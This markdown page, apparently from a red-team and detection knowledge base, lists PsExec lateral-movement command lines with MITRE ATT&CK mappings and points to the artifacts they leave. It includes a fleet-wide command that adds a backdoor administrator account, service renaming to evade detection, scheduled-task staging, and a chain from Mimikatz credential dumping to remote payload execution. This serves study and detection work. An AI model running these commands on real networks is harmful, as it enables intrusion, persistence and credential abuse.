# PsExec (Sysinternals) — Hands-On Use Cases

Every scenario below builds on the protocol mechanics documented in `01 - Overview.md`. Switches are verified against the official [Microsoft Learn PsExec page](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec). Where a command mirrors an Impacket `psexec.py` equivalent, the difference is called out explicitly rather than assumed identical — see `../Impacket/psexec/02 - Hands-On Use Cases.md` for that tool's own use-case set.

## Contents
- [Baseline Remote Shell Using an Already-Authenticated Session](#baseline-remote-shell-using-an-already-authenticated-session)
- [Interactive SYSTEM-Context Shell](#interactive-system-context-shell)
- [Alternate-Credential Execution](#alternate-credential-execution)
- [One-Off, Non-Interactive Command Execution](#one-off-non-interactive-command-execution)
- [Uploading and Running a Custom Local Tool](#uploading-and-running-a-custom-local-tool)
- [Renaming the Service and Binary to Evade Signature Detection](#renaming-the-service-and-binary-to-evade-signature-detection)
- [Fleet-Wide Execution Across the Domain](#fleet-wide-execution-across-the-domain)
- [Fleet-Wide Execution Against an Explicit Target List](#fleet-wide-execution-against-an-explicit-target-list)
- [Elevated-Token Execution](#elevated-token-execution)
- [Limited-User / Low-Integrity Execution](#limited-user--low-integrity-execution)
- [Fully Unattended, Scripted Invocation](#fully-unattended-scripted-invocation)
- [Interactive Desktop-Session Targeting](#interactive-desktop-session-targeting)
- [Chained Workflow — Credential Harvesting Into Signed-Binary Lateral Movement](#chained-workflow--credential-harvesting-into-signed-binary-lateral-movement)

---

## Baseline Remote Shell Using an Already-Authenticated Session

**MITRE ATT&CK:** [T1569.002](https://attack.mitre.org/techniques/T1569/002/) (System Services: Service Execution), [T1021.002](https://attack.mitre.org/techniques/T1021/002/) (Remote Services: SMB/Windows Admin Shares)

```cmd
psexec \\10.10.10.5 cmd
```

The simplest possible invocation — no `-u`, so the target-side process impersonates the operator's own already-authenticated token (a prior domain logon, or a mapped admin session). Per `01 - Overview.md`, this process runs **impersonated, not as SYSTEM**, and per Microsoft's own docs it has **no access to network resources** in this mode (impersonated tokens can't authenticate onward to a third host). Lands in an interactive `cmd.exe` because `cmd` is the default and no redirection flag was given.

## Interactive SYSTEM-Context Shell

**MITRE ATT&CK:** [T1569.002](https://attack.mitre.org/techniques/T1569/002/), [T1078](https://attack.mitre.org/techniques/T1078/) (Valid Accounts) for the privilege context

```cmd
psexec -s -i \\10.10.10.5 cmd
```

`-s` forces execution in the **System account** — the closest Sysinternals PsExec gets to Impacket's `psexec.py` default behavior (which is *always* SYSTEM, with no impersonation option at all). `-i` is required alongside it for a usable interactive console. This is the highest-privilege, most-detectable variant: a SYSTEM-context `cmd.exe` spawned via `services.exe` on a host that didn't have one seconds earlier is the textbook lateral-movement signature this tool is built to leave.

## Alternate-Credential Execution

**MITRE ATT&CK:** [T1078](https://attack.mitre.org/techniques/T1078/) (Valid Accounts), [T1021.002](https://attack.mitre.org/techniques/T1021/002/)

```cmd
psexec \\10.10.10.5 -u CORP\svc-backup -p "P@ssw0rd!" cmd
```

```cmd
:: Omit -p to be prompted for a hidden password instead of exposing it on
:: the command line / in shell history at all
psexec \\10.10.10.5 -u CORP\svc-backup cmd
```

Authenticates as an explicit account rather than riding the operator's own session — the standard pattern once credentials for a service or admin account have been harvested elsewhere in the chain (Mimikatz, `secretsdump.py`, a phishing-derived credential). Unlike Impacket's `-hashes`/`-k`, **this only ever works with a cleartext password** — there is no pass-the-hash or pass-the-ticket path built into this tool at all, a real capability gap worth remembering when comparing the two.

## One-Off, Non-Interactive Command Execution

**MITRE ATT&CK:** [T1569.002](https://attack.mitre.org/techniques/T1569/002/)

```cmd
psexec \\10.10.10.5 -d ipconfig /all
```

`-d` fires the command and returns immediately without waiting for it to finish — no interactive session, no blocking on output. Microsoft's own documented use case for this ("remote-enabling tools like IpConfig that otherwise do not have the ability to show information about remote systems") is exactly the kind of legitimate baseline a hunt has to be tuned against; the same pattern scripted against a recon or staging command is indistinguishable at the command-line level from ordinary admin use.

## Uploading and Running a Custom Local Tool

**MITRE ATT&CK:** [T1570](https://attack.mitre.org/techniques/T1570/) (Lateral Tool Transfer), [T1569.002](https://attack.mitre.org/techniques/T1569/002/)

```cmd
psexec \\10.10.10.5 -c -f "C:\tools\collector.exe" -accepteula
```

`-c` copies a **separate, operator-chosen local file** to the target and executes it — a second, independent file drop from the always-present `PSEXESVC.exe` service binary itself. `-f` forces the copy even if a same-named file already exists on the target (skip the normal existence check); `-v` is the inverse-safety option, copying only if the local copy is newer. This is the direct analog of Impacket's own `-c` flag (see `../Impacket/psexec/02 - Hands-On Use Cases.md`), and produces **two** distinct file-creation events on the target rather than one.

## Renaming the Service and Binary to Evade Signature Detection

**MITRE ATT&CK:** [T1036.005](https://attack.mitre.org/techniques/T1036/005/) (Masquerading: Match Legitimate Name or Location), [T1569.002](https://attack.mitre.org/techniques/T1569/002/)

```cmd
psexec -r WinSystemHelper \\10.10.10.5 -s -i cmd
```

`-r` overrides the default `PSEXESVC` service name — Microsoft's own doc wording is "the name of the remote service to create or interact with." Per `01 - Overview.md`'s finding, independent protocol analysis shows the dropped binary and the resulting named pipes (`WinSystemHelper-<hostname>-<pid>-std*` here, instead of `PSEXESVC-...`) shift together with this one flag, since the pipe-name prefix is read from the service executable's own filename at runtime rather than hardcoded. **What this does not touch:** the PE `OriginalFileName`/`InternalName` metadata baked into the binary at compile time, and the `PSEXEC-<source-hostname>-<8-hex>.key` file written to the target's `C:\Windows\` on every invocation regardless of `-r` — both covered in `05 - Detection and Hunting.md`'s priority table. Real-world incident reporting documents a financially-motivated group using this exact pattern with the custom name `FRAMEPKG.EXE`.

## Fleet-Wide Execution Across the Domain

**MITRE ATT&CK:** [T1570](https://attack.mitre.org/techniques/T1570/), [T1569.002](https://attack.mitre.org/techniques/T1569/002/)

```cmd
psexec \\* -u CORP\svc-backup -p "P@ssw0rd!" -d -accepteula cmd /c "whoami > C:\Windows\Temp\out.txt"
```

`\\*` is a real, documented syntax — per Microsoft's own doc, "if you specify a wildcard (`\\*`), PsExec runs the command on all computers in the current domain." Combined with `-d` (fire-and-forget) and `-accepteula` (no interactive prompt to block a mass run), this is the single most operationally dangerous switch combination this tool exposes for an attacker who has already obtained domain-admin-equivalent credentials — a single command line can touch every domain-joined host in one pass. See `05`'s fleet-wide sweep for the corresponding detection posture.

## Fleet-Wide Execution Against an Explicit Target List

**MITRE ATT&CK:** [T1570](https://attack.mitre.org/techniques/T1570/), [T1569.002](https://attack.mitre.org/techniques/T1569/002/)

```cmd
psexec @targets.txt -u CORP\svc-backup -p "P@ssw0rd!" -d -accepteula cmd /c "net user /add backdoor P@ss123 && net localgroup administrators backdoor /add"
```

`@file` is the scoped alternative to `\\*` — a plain text file, one hostname/IP per line, letting an operator target a BloodHound-informed subset (Tier 0 assets, hosts with cached high-value credentials) rather than the entire domain. This is the realistic "post-recon, pre-ransomware" pattern — narrower, quieter, and harder to distinguish from a legitimate scoped software push than the `\\*` variant above.

## Elevated-Token Execution

**MITRE ATT&CK:** [T1548](https://attack.mitre.org/techniques/T1548/) (Abuse Elevation Control Mechanism) for the UAC-token angle

```cmd
psexec -h \\10.10.10.5 -s cmd
```

`-h` (Vista and later) runs the process with the account's **elevated token**, if one is available — this is not a privilege-escalation exploit, it's using an already-admin-equivalent account's UAC-elevated token rather than its default filtered one. Relevant where an authenticated account is a local admin but the operator needs the un-filtered token for an operation that checks for it explicitly.

## Limited-User / Low-Integrity Execution

**MITRE ATT&CK:** Minor relevance to [T1569.002](https://attack.mitre.org/techniques/T1569/002/) — included for completeness, this is one of the tool's genuinely benign/testing-oriented flags

```cmd
psexec -l -d \\10.10.10.5 "c:\test\payload.exe"
```

`-l` strips Administrators-group membership and restricts the process to Users-group privileges (Low Integrity on Vista+) — Microsoft's own documented use case is testing how software behaves under restricted privilege, e.g. validating a browser or app doesn't require admin rights it shouldn't need. Worth knowing this flag exists mainly so an analyst doesn't over-read a low-privilege PsExec-spawned process as evidence the operator *lacked* admin rights — they may simply have chosen this mode deliberately.

## Fully Unattended, Scripted Invocation

**MITRE ATT&CK:** [T1053](https://attack.mitre.org/techniques/T1053/) (Scheduled Task/Job) for the wrapper-persistence angle, [T1569.002](https://attack.mitre.org/techniques/T1569/002/) for the execution itself

```batch
@echo off
psexec \\%1 -u CORP\svc-backup -p "P@ssw0rd!" -d -accepteula -nobanner cmd /c "C:\Windows\Temp\stage2.bat"
```

```cmd
schtasks /create /tn "Update Check" /tr "C:\Windows\Temp\push.bat 10.10.10.5" /sc daily /st 03:00 /ru SYSTEM
```

`-accepteula` and `-nobanner` together are the signature of a scripted/unattended invocation — an interactive operator rarely bothers suppressing the banner, but a wrapper script that runs headless across many hosts needs both to avoid hanging on a first-run EULA prompt or cluttering log output. Note per `01`/`03`: `-accepteula` suppresses the *dialog*, not the underlying `EulaAccepted` registry write — that artifact still lands. See `../LOLBins/schtasks/` for the Scheduled Task persistence mechanics this wrapper pattern rides on rather than re-deriving them here.

## Interactive Desktop-Session Targeting

**MITRE ATT&CK:** [T1021.002](https://attack.mitre.org/techniques/T1021/002/)

```cmd
psexec -i 2 \\10.10.10.5 -s cmd
```

`-i [session]` attaches the interactive process to a specific desktop session rather than the console session (session 0/1 by default if omitted) — relevant on a multi-session host (RDS/terminal server) where the operator wants their launched process visible on a particular logged-on user's desktop rather than the console. `-i` with no session number targets the console session and is required for any console app that needs its stdin/stdout/stderr genuinely redirected.

## Chained Workflow — Credential Harvesting Into Signed-Binary Lateral Movement

**MITRE ATT&CK:** Composite of the above, plus [T1003](https://attack.mitre.org/techniques/T1003/) (OS Credential Dumping) for the preceding stage

```
1. Operator already has an interactive foothold on host A (prior initial access)
2. Mimikatz sekurlsa::logonpasswords, or Impacket's secretsdump.py against a DC,
   recovers a domain-admin-equivalent credential (see ../Mimikatz/sekurlsa
   (Credential Dumping)/ and ../Impacket/secretsdump/)
3. BloodHound/SharpHound collection (already run, or run now) identifies which
   hosts that credential can reach with local-admin rights
4. Operator DELIBERATELY chooses signed Sysinternals PsExec over Impacket's
   psexec.py for the lateral hop — it's a legitimate, Microsoft-signed binary
   already present on many admin workstations, so its execution blends into a
   baseline of genuine remote-administration activity in a way an unsigned
   from-scratch reimplementation cannot
5. psexec \\target1,target2,target3 -u CORP\administrator -p <recovered-password>
   -s -d -accepteula cmd /c "C:\Windows\Temp\stage2.exe"
```

This is the realistic end-to-end shape: credential-theft tooling and AD-attack-path mapping (already covered elsewhere in this module) identify *where* to go, and the choice between PsExec, Impacket's clone, WMI, or PowerShell Remoting for the actual hop is itself an operational decision — genuine PsExec is specifically attractive where the target environment is known to allowlist or otherwise trust Sysinternals tools. See `../Mimikatz/00 - Mimikatz Overview.md` and `../BloodHound/00 - BloodHound Overview.md` for the stages that typically precede this one.
